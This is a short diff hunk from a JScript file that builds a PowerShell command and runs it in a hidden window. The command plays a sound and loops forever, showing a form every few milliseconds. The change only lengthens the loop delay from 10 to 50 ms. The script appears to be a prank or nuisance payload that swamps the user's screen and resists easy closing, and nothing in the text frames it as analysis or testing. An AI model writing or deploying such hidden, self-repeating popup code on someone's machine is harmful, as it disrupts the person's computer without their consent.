@@ -21,7 +21,7 @@ c = '$a = New-Object System.Media.SoundPlayer;' +
     '$a.Play();' +
     'while ($true) {' +
     '    (nf).Show();' +
-    '    Start-Sleep -Milliseconds 10;' +
+    '    Start-Sleep -Milliseconds 50;' +
     '}'
 
 new ActiveXObject('WScript.Shell').run('cmd /c powershell ' + c, 0, true);
